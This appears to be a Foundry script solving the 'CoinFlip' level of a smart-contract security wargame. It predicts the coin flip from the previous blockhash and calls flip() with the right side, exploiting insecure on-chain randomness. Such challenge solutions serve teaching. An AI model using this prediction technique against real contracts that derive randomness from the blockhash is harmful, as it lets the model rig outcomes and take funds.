// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { CoinFlip } from "../src/level3.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

/// @notice insecure randomness
contract Player {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinFlipInstance) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _coinFlipInstance.flip(side);
    }
}

contract Level3Solution is Script {
    CoinFlip public level = CoinFlip(0xeDd1a55a6556De23973417C5a3392F55301a4b82);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Player(level);
        console.log("consecutiveWins: ", level.consecutiveWins());
        vm.stopBroadcast();
    }
    

}